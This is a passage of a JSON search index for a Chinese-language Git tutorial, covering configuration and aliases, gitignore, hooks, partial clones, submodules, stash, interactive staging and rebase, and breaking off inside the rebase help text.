<p>\u200b\u63d0\u793a\u200b\uff1a\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u8ba9\u200b\u8fdc\u7a0b\u200b\u548c\u200b\u672c\u5730\u200b\u4e00\u81f4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b <code>git push -f</code>\uff0c\u200b\u4f46\u662f\u200b <code>git pull -f</code> \u200b\u662f\u200b\u4e0d\u200b\u6b63\u786e\u200b\u7684\u200b\u3002\u200b\u4f60\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b <code>git fetch</code> \u200b\u4e0e\u200b <code>git reset</code>\u3002</p>"},{"location":"dev/git/#git-staging","title":"Staging Area","text":"<p>\u200b\u5728\u200b\u8fd0\u884c\u200b <code>git status</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u770b\u5230\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\u7684\u200b\u8f93\u51fa\u200b\uff1a</p> <pre><code>$ git status\nOn branch master\nYour branch is up to date with 'origin/master'.\n\nChanges not staged for commit:\n  (use \"git add &lt;file&gt;...\" to update what will be committed)\n  (use \"git restore &lt;file&gt;...\" to discard changes in working directory)\n    modified:   docs/dev/git.md\n\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b \"Changes not staged for commit\" \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u4fee\u6539\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u88ab\u200b\u6dfb\u52a0\u200b\u5230\u200b staging area\uff08\u200b\u6682\u5b58\u533a\u200b\uff0c\u200b\u4e5f\u200b\u53eb\u200b index\uff09\u200b\u4e2d\u200b\u3002\u200b\u5e38\u7528\u200b\u7684\u200b\u8bf8\u5982\u200b <code>git add</code>\u3001<code>git rm --cached</code> \u200b\u7b49\u200b\u547d\u4ee4\u200b\u5c31\u662f\u200b\u7528\u6765\u200b\u5728\u200b staging area \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u3001\u200b\u5220\u9664\u200b\u6587\u4ef6\u200b\u7684\u200b\u3002</p>"},{"location":"dev/git/#git-config-file","title":"\u672c\u5730\u200b\u914d\u7f6e","text":"<p>\u200b\u914d\u7f6e\u6587\u4ef6\u200b</p> <p>Git \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e00\u822c\u200b\u5b58\u653e\u200b\u4e8e\u200b <code>~/.gitconfig</code> \u200b\u6216\u200b <code>~/.config/git/config</code> \u200b\u4e2d\u200b, \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git config --global --edit</code> \u200b\u5feb\u901f\u200b\u6253\u5f00\u200b\u914d\u7f6e\u6587\u4ef6\u200b, \u200b\u4f60\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u62f7\u8d1d\u200b\u4e0b\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> <p>\u200b\u4e0b\u6587\u200b\u4e2d\u200b\u4f1a\u200b\u8bb2\u89e3\u200b\u90e8\u5206\u200b\u914d\u7f6e\u200b\u7684\u200b\u4f5c\u7528\u200b\u53ca\u200b\u6ce8\u610f\u4e8b\u9879\u200b\u3002</p> <p>\u200b\u7f29\u8fdb\u200b\u95ee\u9898\u200b</p> <p>\u200b\u4e0b\u9762\u200b\u7684\u200b\u6587\u6863\u200b\u4e2d\u200b\uff0c<code>.gitconfig</code> \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5747\u200b\u4f7f\u7528\u200b 4 \u200b\u4e2a\u200b\u7a7a\u683c\u200b\u800c\u200b\u4e0d\u662f\u200b Tab \u200b\u8fdb\u884c\u200b\u7f29\u8fdb\u200b\u3002</p>"},{"location":"dev/git/#git-alias","title":"\u5e38\u7528\u200b\u522b\u540d","text":"<pre><code>[alias]\n    aliases = !git config --get-regexp alias | sed -re 's/alias\\\\.(\\\\S*)\\\\s(.*)$/\\\\1 = \\\\2/g'\n    ci = commit\n    co = checkout\n    st = status\n    lg = log --graph --date=relative --pretty=tformat:'%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%an %ad)%Creset'\n    oops = commit --amend --no-edit\n    reword = commit --amend\n    push-with-lease = push --force-with-lease\n    uncommit = reset --soft HEAD~1\n</code></pre> <p>\u200b\u90e8\u5206\u200b\u522b\u540d\u200b\u4ecb\u7ecd\u200b</p> <p><code>git commit --amend</code> \u200b\u7528\u6765\u200b\u4fee\u6539\u200b\u4e0a\u200b\u4e00\u4e2a\u200b commit \u200b\u7684\u200b\u5185\u5bb9\u200b\uff08\u200b\u5305\u62ec\u200b commit \u200b\u6d88\u606f\u200b\uff09\uff1a\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u65b0\u200b\u7684\u200b\u4fee\u6539\u200b stage \u200b\u540e\u200b\u4f7f\u7528\u200b\u8be5\u200b\u547d\u4ee4\u200b\u4fee\u6539\u200b\u4e0a\u200b\u4e00\u4e2a\u200b commit\u3002\u200b\u5982\u679c\u200b\u6dfb\u52a0\u200b\u4e86\u200b <code>--no-edit</code>\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u8df3\u200b\u8fc7\u200b\u6d88\u606f\u200b\u7f16\u8f91\u200b\u3002</p> <p><code>git push --force-with-lease</code> \u200b\u5728\u200b force push \u200b\u4e4b\u524d\u200b\u5148\u200b\u68c0\u67e5\u200b remote \u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b remote \u200b\u6709\u200b\u672c\u5730\u200b\u4e0d\u200b\u5b58\u5728\u200b\u7684\u200b\u65b0\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u8be5\u200b\u547d\u4ee4\u200b\u5c31\u200b\u4f1a\u200b\u963b\u6b62\u200b\u6b64\u6b21\u200b force push \u200b\u64cd\u4f5c\u200b\u3002</p>"},{"location":"dev/git/#git-config","title":"\u5e38\u7528\u200b\u914d\u7f6e","text":"<pre><code>[color]\n    ui = auto\n[color \"branch\"]\n    upstream = green\n    remote = red\n[core]\n    editor = nvim\n    excludesfile = ~/.gitignore_global\n[commit]\n    template = ~/.gitmessage\n[pull]\n    ff = only\n[push]\n    default = upstream\n    followTags = true\n[tag]\n    sort = version:refname\n</code></pre> <p>\u200b\u6211\u4eec\u200b\u4e5f\u200b\u5c06\u200b\u4e0a\u8ff0\u200b\u7684\u200b <code>.gitconfig</code> \u200b\u6b63\u786e\u200b\u4f7f\u7528\u200b Tab \u200b\u7f29\u8fdb\u200b\u7684\u200b\u7248\u672c\u200b\u653e\u5728\u200b \u200b\u8fd9\u91cc\u200b. \u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u5feb\u901f\u200b\u5c06\u200b\u6211\u4eec\u200b\u63d0\u4f9b\u200b\u7684\u200b\u6a21\u677f\u200b\u653e\u5165\u200b\u4f60\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\uff1a</p> <pre><code>curl -sS https://201.ustclug.org/assets/gitconfig_sample &gt;&gt; ~/.gitconfig\n</code></pre>"},{"location":"dev/git/#git-gitignore","title":"gitignore","text":"<p>GitHub \u200b\u5728\u200b \u200b\u8fd9\u91cc\u200b \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b <code>.gitignore</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u8f83\u4e3a\u200b\u590d\u6742\u200b\u7684\u200b\u9879\u76ee\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200bgitignore.io \u200b\u751f\u6210\u200b\u3002</p> <p>\u200b\u4ec5\u200b\u672c\u5730\u200b\u7684\u200b gitignore</p> <p>\u200b\u672c\u5730\u200b\u7684\u200b <code>.git/info/exclude</code> \u200b\u8d77\u5230\u200b\u4e0e\u200b <code>.gitignore</code> \u200b\u76f8\u540c\u200b\u7684\u200b\u4f5c\u7528\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u63d0\u4ea4\u200b\u5230\u200b\u7248\u672c\u200b\u5e93\u4e2d\u200b\uff0c\u200b\u9002\u7528\u200b\u4e8e\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u60c5\u51b5\u200b\uff1a</p> <ul> <li>\u200b\u9879\u76ee\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u4fee\u6539\u200b <code>.gitignore</code></li> <li>\u200b\u76ee\u5f55\u200b\u540d\u79f0\u200b\u672c\u8eab\u200b\u5305\u542b\u200b\u654f\u611f\u200b\u4fe1\u606f\u200b</li> <li>\u200b\u4e0d\u200b\u5e0c\u671b\u200b <code>.gitignore</code> \u200b\u53c2\u4e0e\u200b\u5230\u200b\u7248\u672c\u63a7\u5236\u200b\u4e2d\u200b</li> </ul> <p>\u200b\u8be6\u7ec6\u200b\u7684\u200b\u6587\u6863\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u8fd9\u91cc\u200b\u3002</p>"},{"location":"dev/git/#git-global-gitignore","title":"Global gitignore","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u6587\u4ef6\u7c7b\u578b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5168\u5c40\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u6307\u5b9a\u200b\uff1a</p> <pre><code>[core]\n    excludesfile = ~/.gitignore_global\n</code></pre> <pre><code># ~/.gitignore_global\n*~\n.DS_Store # for macOS\n.idea\n*.cache\n.vscode\n</code></pre>"},{"location":"dev/git/#git-hooks","title":"Git Hook","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4e00\u4e9b\u200b\u91cd\u590d\u6027\u200b\u7684\u200b\u5de5\u4f5c\u200b\uff08\u200b\u4f8b\u5982\u200b\u683c\u5f0f\u5316\u200b\u4ee3\u7801\u200b\u3001\u200b\u68c0\u67e5\u200b\u4ee3\u7801\u200b\u98ce\u683c\u200b\u7b49\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Git Hook \u200b\u6765\u200b\u81ea\u52a8\u5316\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u53eb\u200b\u8f83\u4e3a\u200b\u6210\u719f\u200b\u7684\u200b\u6846\u67b6\u200b\u662f\u200b pre-commit\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b\u591a\u79cd\u8bed\u8a00\u200b\u548c\u200b\u5de5\u5177\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>black</code>\u3001<code>flake8</code>\u3001<code>eslint</code> \u200b\u7b49\u200b\uff0c\u200b\u8fd9\u91cc\u200b \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b hook.</p> <p>\u200b\u5982\u679c\u200b\u53ea\u200b\u9700\u8981\u200b\u5728\u200b commit \u200b\u540e\u200b\u8fd0\u884c\u200b\u4e00\u6bb5\u200b\u811a\u672c\u200b</p> <p>\u200b\u53ef\u4ee5\u200b\u6309\u7167\u200b\u5982\u4e0b\u200b\u65b9\u6cd5\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\uff1a <pre><code># \u200b\u5728\u200b\u9879\u76ee\u200b\u6839\u76ee\u5f55\u200b\u4e0b\u200b\u521b\u5efa\u200b .git/hooks/post-commit\ntouch .git/hooks/__hook_name__\nchmod +x .git/hooks/__hook_name__\n</code></pre></p> <pre><code># .git/hooks/post-commit\n#!/bin/bash\n\n# \u200b\u5728\u200b\u8fd9\u91cc\u200b\u5199\u5165\u200b\u4f60\u200b\u7684\u200b\u811a\u672c\u200b\nfor file in $(git diff --cached --name-only --diff-filter=ACM | grep '\\.py$'); do\n    black $file\ndone\n</code></pre>"},{"location":"dev/git/#partial-clone","title":"\u90e8\u5206\u200b clone","text":"<p>Git \u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u90e8\u5206\u200b clone \u200b\u7684\u200b\u65b9\u5f0f\u200b\uff1a</p> <ul> <li>blobless\uff0c\u200b\u4e0d\u200b clone HEAD \u200b\u672a\u200b\u6d89\u53ca\u200b\u7684\u200b blob\uff1a<code>git clone --filter=blob:none &lt;url&gt;</code></li> <li>treeless\uff0c\u200b\u4e0d\u200b clone HEAD \u200b\u672a\u200b\u6d89\u53ca\u200b\u7684\u200b blob \u200b\u548c\u200b tree\uff1a<code>git clone --filter=tree:0 &lt;url&gt;</code></li> <li>shallow\uff0c\u200b\u4e0d\u200b clone HEAD \u200b\u672a\u200b\u6d89\u53ca\u200b\u7684\u200b blob\u3001tree \u200b\u548c\u200b commit\uff08\u200b\u4e0d\u200b\u63a8\u8350\u200b\uff09\uff1a<code>git clone --depth=1 --single-branch &lt;url&gt;</code></li> </ul> <p>\u200b\u5728\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u5e38\u89c1\u200b\u7684\u200b\u90e8\u5206\u200b clone \u200b\u65b9\u5f0f\u200b\u4e3a\u200b <code>--depth=1</code>\uff0c\u200b\u4f46\u662f\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff1a<code>--depth=1</code> \u200b\u5728\u200b\u540e\u7eed\u200b\u66f4\u65b0\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u7ed9\u200b\u670d\u52a1\u5668\u200b\u548c\u200b\u7f51\u7edc\u5e26\u5bbd\u200b\u5e26\u6765\u200b\u975e\u5e38\u200b\u5927\u200b\u7684\u200b\u8d1f\u62c5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5efa\u8bae\u200b\u4ec5\u200b\u5728\u200b\u7528\u200b\u5b8c\u5373\u200b\u5220\u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\u4f7f\u7528\u200b\u3002\u200b\u56e0\u4e3a\u200b shallow clone \u200b\u6ca1\u6709\u200b\u5b58\u50a8\u200b\u5386\u53f2\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5728\u200b\u67d0\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u670d\u52a1\u5668\u200b\u9700\u8981\u200b\u7d22\u5f15\u200b\u5168\u90e8\u200b\u5386\u53f2\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e00\u200b\u8fc7\u7a0b\u200b\u96be\u4ee5\u200b\u4f18\u5316\u200b\u3002\u200b\u4e00\u4e2a\u200b\u77e5\u540d\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b\uff1a\u200b\u7531\u4e8e\u200b shallow clone \u200b\u7ed9\u200b\u670d\u52a1\u5668\u200b\u5e26\u6765\u200b\u7684\u200b\u538b\u529b\u200b\u8fc7\u5927\u200b\uff0cGitHub \u200b\u52d2\u4ee4\u200b\u8981\u6c42\u200b Homebrew \u200b\u4e0d\u200b\u5141\u8bb8\u200b shallow clone\u3002</p> <p>\u200b\u6709\u5173\u200b\u66f4\u200b\u591a\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ef\u200b\u9605\u8bfb\u200b Get up to speed with partial clone and shallow clone\u3002</p>"},{"location":"dev/git/#git-submodule","title":"Git Submodule","text":"<p>Submodule \u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u6dfb\u52a0\u200b\u5916\u90e8\u200b\u9879\u76ee\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5411\u200b\u4e00\u4e2a\u200b C++ \u200b\u9879\u76ee\u200b\u4e2d\u200b\u6dfb\u52a0\u200b Eigen\uff1a</p> <pre><code>git submodule add https://gitlab.com/libeigen/eigen.git src/eigen\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b clone \u200b\u5230\u200b\u4e86\u200b\u5b50\u76ee\u5f55\u200b <code>src/eigen</code> \u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5982\u4e0b\u200b\u65b9\u6cd5\u200b\u6dfb\u52a0\u200b\uff1a</p> <pre><code>git rm --cached -f src/eigen # if you've already added it to the index\ngit submodule add &lt;url_of_eigen&gt; src/eigen\n</code></pre> <p>\u200b\u521d\u59cb\u5316\u200b\u3001\u200b\u66f4\u65b0\u200b submodule \u200b\u7b49\u200b\u64cd\u4f5c\u200b\u5219\u200b\u4f7f\u7528\u200b <code>git submodule update</code> \u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>git submodule update --init --recursive # clone \u200b\u540e\u200b\u521d\u59cb\u5316\u200b\u5e76\u62c9\u53d6\u200b submodule\ngit submodule update --remote --recursive # \u200b\u66f4\u65b0\u200b submodule \u200b\u5230\u200b\u8fdc\u7a0b\u200b\u6700\u65b0\u200b\u7248\u672c\u200b\n</code></pre>"},{"location":"dev/git/#git-stash","title":"Stash","text":"<p>\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u5728\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u8fdb\u884c\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u4fee\u6539\u200b\uff0c\u200b\u8fd8\u200b\u6ca1\u6709\u200b commit\uff08\u200b\u4f8b\u5982\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5b8c\u5168\u200b\u5b8c\u6210\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b\u9700\u8981\u200b\u5207\u6362\u200b\u5230\u200b\u5176\u4ed6\u200b\u5206\u652f\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\u3002\u200b\u8fd9\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git stash</code> \u200b\u5c06\u200b\u5f53\u524d\u200b\u7684\u200b\u4fee\u6539\u200b\u653e\u5728\u200b stash \u200b\u4e2d\u200b\uff0c\u200b\u64cd\u4f5c\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git stash pop</code> \u200b\u5c06\u200b\u4fee\u6539\u200b\u6062\u590d\u200b\u5230\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u3002</p>"},{"location":"dev/git/#git-add-patch","title":"\u4ea4\u4e92\u5f0f\u200b stage","text":"<p>\u200b\u4f60\u200b\u662f\u5426\u200b\u6709\u65f6\u200b\u4e00\u65f6\u200b\u5174\u8d77\u200b\uff0c\u200b\u5199\u200b\u4e86\u200b\u6216\u8005\u200b\u6539\u4e86\u200b\u5f88\u591a\u5f88\u591a\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u4e0d\u60f3\u200b\u628a\u200b\u6240\u6709\u200b\u4fee\u6539\u200b\u4e00\u80a1\u8111\u200b\u585e\u8fdb\u200b\u4e00\u4e2a\u200b commit \u200b\u91cc\u9762\u200b\uff1f\u200b\u867d\u7136\u200b <code>git add</code> \u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u53ea\u200b commit \u200b\u6307\u5b9a\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4f46\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u5728\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u91cc\u9762\u200b\u4f1a\u200b\u6709\u200b\u591a\u4e2a\u200b\u4fee\u6539\u200b\uff0c\u200b\u600e\u4e48\u200b\u628a\u200b\u8fd9\u4e9b\u200b\u4fee\u6539\u200b\u300c\u200b\u62c6\u5f00\u6765\u200b\u300d\u200b\u5462\u200b\uff1f</p> <p>\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git add -p</code> \u200b\u6765\u200b\u9009\u62e9\u200b\u6307\u5b9a\u200b\u7684\u200b\u4fee\u6539\u200b\uff0c\u200b\u8be5\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u5c06\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u4fee\u6539\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b\u5757\u200b\uff08hunk\uff09\uff0c\u200b\u5e76\u200b\u8be2\u95ee\u200b\u4f60\u200b\u662f\u5426\u200b\u5c06\u200b\u8be5\u200b\u5757\u200b\u6dfb\u52a0\u200b\u5230\u200b staging area \u200b\u4e2d\u200b\uff0c\u200b\u5982\u200b\u4ee5\u4e0b\u200b\u6240\u793a\u200b\uff1a</p> <pre><code>diff --git a/docs/dev/git.md b/docs/dev/git.md\nindex 80c4501..4085b25 100644\n--- a/docs/dev/git.md\n+++ b/docs/dev/git.md\n@@ -114,6 +114,10 @@ d959e182468be92957bd175d189472de91f614c8\n\n     `HEAD~n` \u200b\u8868\u793a\u200b `HEAD` \u200b\u7684\u200b\u7b2c\u200b n \u200b\u4e2a\u7236\u200b\u63d0\u4ea4\u200b\uff08\u200b\u524d\u200b n \u200b\u4e2a\u200b\u63d0\u4ea4\u200b\uff09\u3002\n\n+!!! question \"\u200b\u6bd4\u8f83\u200b\u5dee\u5f02\u200b\"\n+\n+    \u200b\u5982\u679c\u200b\u9700\u8981\u200b\u6bd4\u8f83\u200b\u5f53\u524d\u200b commit \u200b\u76f8\u6bd4\u200b\u4e0a\u200b\u4e00\u4e2a\u200b commit \u200b\u4fee\u6539\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u4e1c\u897f\u200b\uff0c\u200b\u5e94\u8be5\u200b\u8f93\u5165\u200b\u7684\u200b\u547d\u4ee4\u200b\u662f\u200b\uff1f\n+\n #### Remote {#git-remote}\n\n \u200b\u7edd\u5927\u90e8\u5206\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u90fd\u200b\u6709\u200b\u672c\u5730\u200b\u4e0e\u200b\u8fdc\u7a0b\u200b\u4ed3\u5e93\u200b\u4ea4\u4e92\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u4e5f\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b remote \u200b\u76f8\u5173\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\n(1/4) Stage this hunk [y,n,q,a,d,j,J,g,/,e,p,?]?\n</code></pre> <p>\u200b\u5982\u679c\u200b\u6709\u200b\u591a\u4e2a\u200b\u4fee\u6539\u200b\u5728\u200b\u4e00\u4e2a\u200b hunk \u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8f93\u5165\u200b <code>s</code> \u200b\u5c06\u200b\u8be5\u200b hunk \u200b\u62c6\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b hunk\u3002\u200b\u5982\u679c\u200b\u8fd9\u6837\u200b\u90fd\u200b\u65e0\u6cd5\u200b\u62c6\u5206\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8f93\u5165\u200b <code>e</code> \u200b\u624b\u52a8\u200b\u9009\u62e9\u200b\u9700\u8981\u200b stage \u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"dev/git/#git-rebase-merge","title":"Rebase \u200b\u4e0e\u200b Merge","text":"<p>\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u4fdd\u6301\u200b\u9879\u76ee\u200b\u6709\u200b\u7ebf\u6027\u200b\u7684\u200b\u63d0\u4ea4\u200b\u5386\u53f2\u200b\uff08\u200b\u5373\u200b\u4e0d\u200b\u5305\u542b\u200b\u6709\u200b\u591a\u4e2a\u200b parent \u200b\u7684\u200b merge commit\uff09\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u66f4\u200b\u5bb9\u6613\u200b\u5730\u200b\u8ffd\u6eaf\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u6b64\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b <code>rebase</code> \u200b\u6765\u200b\u5408\u5e76\u200b\u5206\u652f\u200b\u3002</p> <pre><code>git checkout -b feature\ngit commit -a --allow-empty -m \"feat: aaaaaa\"\ngit checkout master\ngit commit -a --allow-empty -m \"feat: bbbbbb\"\ngit checkout feature\ngit rebase master\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u5982\u4e0b\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u5f97\u200b <code>rebase</code> \u200b\u6210\u4e3a\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\uff1a</p> <pre><code>[pull]\n    rebase = true\n</code></pre> <p>\u200b\u66f4\u65b0\u200b\u4e00\u4e2a\u200b\u6709\u200b\u4fee\u6539\u200b\u7684\u200b\u672c\u5730\u200b\u4ed3\u5e93\u200b</p> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e2a\u200b\u73b0\u5b9e\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a\u200b\u67d0\u4e2a\u200b\u4ee3\u7801\u200b git \u200b\u4ed3\u5e93\u200b\uff08\u200b\u5b58\u50a8\u200b\u5728\u200b GitHub \u200b\u4e0a\u200b\uff09\u200b\u7684\u200b <code>master</code> \u200b\u5206\u652f\u200b\u90e8\u7f72\u200b\u5728\u200b\u4e00\u53f0\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u8be5\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u4e0d\u4ec5\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b commit \u200b\u7528\u6765\u200b\u8bb0\u5f55\u200b\u4e00\u4e9b\u200b\u670d\u52a1\u5668\u200b\u76f8\u5173\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u6ca1\u6709\u200b\u88ab\u200b stage \u200b\u7684\u200b\u6587\u4ef6\u200b\u3002\u200b\u73b0\u5728\u200b\u8be5\u200b\u4ee3\u7801\u200b\u4ed3\u5e93\u200b\u5728\u200b GitHub \u200b\u4e0a\u200b\u7684\u200b <code>master</code> \u200b\u5206\u652f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u65b0\u200b\u7684\u200b\u66f4\u65b0\u200b commit\uff08\u200b\u4f8b\u5982\u200b\u66f4\u65b0\u200b\u4e86\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u4fee\u590d\u200b\u4e86\u200b bug \u200b\u7b49\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5982\u4f55\u200b\u5c06\u200b\u8fd9\u4e9b\u200b commit \u200b\u90e8\u7f72\u200b\u5728\u200b\u8be5\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u5462\u200b\uff1f</p> <p>\u200b\u63d0\u793a\u200b\uff1a\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9700\u8981\u200b <code>git fetch</code>\u3001<code>git stash</code> \u200b\u4e0e\u200b <code>git rebase</code>\u3002</p> <p>\u200b\u4ea4\u4e92\u5f0f\u200b rebase</p> <p><code>git rebase</code> \u200b\u53e6\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u529f\u80fd\u200b\u662f\u200b\u4fee\u6539\u200b commit \u200b\u5386\u53f2\u8bb0\u5f55\u200b\u3002\u200b\u4f7f\u7528\u200b <code>git rebase -i HEAD~n</code> \u200b\u6765\u200b\u4fee\u6539\u200b\u5386\u53f2\u200b\u4ee5\u6765\u200b\u7684\u200b n \u200b\u4e2a\u200b commit\u3002\u200b\u5728\u200b\u8f93\u5165\u200b\u547d\u4ee4\u200b\u540e\u200b\uff0cgit \u200b\u4f1a\u200b\u6253\u5f00\u200b\u7f16\u8f91\u5668\u200b\uff0c\u200b\u5c06\u200b commit \u200b\u4ece\u200b\u65e7\u200b\u5230\u200b\u65b0\u200b\u6392\u5e8f\u200b\uff0c\u200b\u663e\u793a\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\u7684\u200b\u5185\u5bb9\u200b\uff1a</p> <pre><code>pick b9c96cc Install XDG Desktop Portal\npick d20fcf1 Set 2048m mem when running qemu\npick 74fd856 Add gnome-software; clean comments\n\n# Rebase ebb0dcf..74fd856 onto ebb0dcf (3 commands)\n#\n# Commands:\n# p, pick &lt;commit&gt; = use commit\n# r, reword &lt;commit&gt; = use commit, but edit the commit message\n# e, edit &lt;commit&gt; = use commit, but stop for amending\n# s, squash &lt;commit&gt; = use commit, but meld into previous commit\n# f, fixup [-C | -c] &lt;commit&gt; = like \"squash\" but keep only the previous\n#                    commit's log message, unless -C is used, in which case\n#                    keep only this commit's message; -c is same as -C but\n#                    opens the editor\n# x, exec &lt;command&gt; = run command (the rest of the line) using shell\n# b, break = stop here (continue rebase later with 'git rebase --continue')\n# d, drop &lt;commit&gt; = remove commit\n# l, label &lt;label&gt; = label current HEAD with a name\n# t, reset &lt;label&gt; = reset HEAD to a label\n# m, merge [-C &lt;commit&gt; | -c &lt;commit&gt;] &lt;label&gt; [# &lt;oneline&gt;]\n#         create a merge commit using the original merge commit's\n#         message (or the oneline, if no original merge commit was\n#         specified); use -c &lt;commit&gt; to reword the commit message\n# u, update-ref 